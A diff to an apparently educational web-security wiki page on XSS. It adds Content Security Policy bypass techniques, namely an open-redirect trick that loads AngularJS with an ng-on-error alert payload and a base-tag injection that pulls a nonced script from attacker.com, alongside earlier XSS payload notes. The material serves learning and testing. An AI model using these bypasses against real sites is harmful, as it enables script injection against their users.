@@ -428,7 +428,7 @@ JQuery also has many other methods and CVEs if malicious input ends up in specif
 
 When placing common XSS payloads in the triggers above, it becomes clear that they are not all the same. Most notably, the `<img src onerror=alert()>` payload is the most universal as it works in every situation, even when it is not added to the DOM yet. The common and short `<svg onload=alert()>` payload is interesting as it is only triggered via `.innerHTML` on Chome, and not Firefox. Lastly, the `<script>` tag does not load when added with `.innerHTML` at all.
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
 
 {% file src="../.gitbook/assets/domxss-trigger-table.html" %}
 **Source code** for script used to generate and **test** the results in the table above
@@ -766,9 +766,18 @@ The second reason this is hard is because browsers are _weird_, like _really wei
 
 A more modern protection against XSS and some other attacks is the [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP). This is a Header (`Content-Security-Policy:`) or `<meta>` value in a response that tells the browser what should be allowed, and what shouldn't. An important directive that can be set using this header is [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src), defining where JavaScript code may come from:
 
+{% code title="HTTP" %}
 ```http
 Content-Security-Policy: script-src 'self' https://example.com/
 ```
+{% endcode %}
+
+{% code title="HTML" overflow="wrap" %}
+```html
+<meta http-equiv="Content-Security-Policy" 
+      content="script-src 'self' https://example.com/">
+```
+{% endcode %}
 
 With the above policy set, any `<script src=...>` that is _not_ from the current domain or "example.com" will be blocked. When you explicitly set a policy like this it also disables inline scripts like `<script>alert()</script>` or event handlers like `<style onload=alert()>` from executing, even ones from the server itself as there is no way to differentiate between intended and malicious. This possibly breaking change where all scripts need to come from trusted URLs is sometimes "fixed" by adding a special [`'unsafe-inline'`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe\_inline\_script) string that allows inline script tags and event handlers to execute, which as the name suggests, is very **unsafe**.&#x20;
 
@@ -905,7 +914,61 @@ Loading any of these blocks in a CSP that allows it, will trigger the `alert(doc
 
 See [jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a not-so-updated list of public JSONP endpoints you may find useful.&#x20;
 
+{% embed url="https://cspbypass.com/" %}
+Public list of Angular/JSONP gadgets for CSP Bypasses
+{% endembed %}
+
 See [#angularjs](cross-site-scripting-xss.md#angularjs "mention") for more complex AngularJS injections that bypass filters. Also, note that other frameworks such as [#vuejs](cross-site-scripting-xss.md#vuejs "mention") or [#htmx](cross-site-scripting-xss.md#htmx "mention") may allow similar bypasses if they are accessible when `unsafe-eval` is set in the CSP.
+
+#### Redirect to upper directory
+
+URLs in a CSP may be absolute, not just an origin. The following example provides a full URL to `base64.min.js`, and you would expect only that script could be loaded from the `cdn.js.cloudflare.com` origin.
+
+{% code overflow="wrap" %}
+```http
+Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/Base64/1.3.0/base64.min.js
+```
+{% endcode %}
+
+This is not entirely true, however. If another origin, like `'self'` contains an **Open Redirect** vulnerability, you may redirect a script URL to any path on `cdnjs.cloudflare.com`!
+
+{% embed url="https://joaxcar.com/blog/2024/05/16/sandbox-iframe-xss-challenge-solution/" %}
+Challenge writeup involving CSP open redirect bypass
+{% endembed %}
+
+The following script would be allowed by the [CSP spec](https://www.w3.org/TR/CSP3/#source-list-paths-and-redirects), note that the `angular.js` path is not normally allowed, but it is through the redirect because its origin is allowed. This can be abused with some HTML that executes arbitrary JavaScript, even if `'unsafe-eval'` is not set:
+
+<pre class="language-html" data-overflow="wrap"><code class="lang-html"><strong>&#x3C;script src="/redirect?url=https%3A%2F%2Fcdnjs.cloudflare.com%2Fajax%2Flibs%2Fangular.js%2F1.8.3%2Fangular.min.js">&#x3C;/script>
+</strong>&#x3C;div ng-app>&#x3C;img src=x ng-on-error="$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.defaultView.origin)">&#x3C;/div>
+</code></pre>
+
+#### Nonce without base-src
+
+If a CSP filters scripts based on a **nonce**, and does not specify a `base-src` directive, you may be able to hijack relative URLs after your injection point.
+
+{% code overflow="wrap" %}
+```http
+Content-Security-Policy: script-src 'nonce-abc'
+```
+{% endcode %}
+
+Let's say the target page with an HTML-injection looks as follows:
+
+<pre class="language-html"><code class="lang-html">&#x3C;body>
+  INJECT_HERE
+<strong>  &#x3C;script nonce="abc" src="/script.js">
+</strong>&#x3C;/body>
+</code></pre>
+
+The relative `<script>` tag can be redirect to another domain using the `<base>` tag as follows:
+
+<pre class="language-html"><code class="lang-html">&#x3C;body>
+<strong>  &#x3C;base href="https://attacker.com">
+</strong>  &#x3C;script nonce="abc" src="/script.js">
+&#x3C;/body>
+</code></pre>
+
+Now, the script with a valid nonce is loaded from `https://attacker.com/script.js` instead of the target website!
 
 ### Filter Bypasses
 
@@ -987,7 +1050,7 @@ See what happened here? It suddenly closed with the `</title>` tag and started a
 
 DOMPurify does not know of the `<title>` tag the application puts it in later, so it can only say if the HTML is safe on its own. In this case, it is, so we bypass the check through Mutation XSS.&#x20;
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Example from <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">mizu.re's writeup</a> showing the difference between the browser and DOMPurify</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Example from <a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">mizu.re's writeup</a> showing the difference between the browser and DOMPurify</p></figcaption></figure>
 
 A quick for-loop later we can find that this same syntax works for all these tags:\
 `iframe`, `noembed`, `noframes`, `noscript`, `script`, `style`, `textarea`, `title`, `xmp`
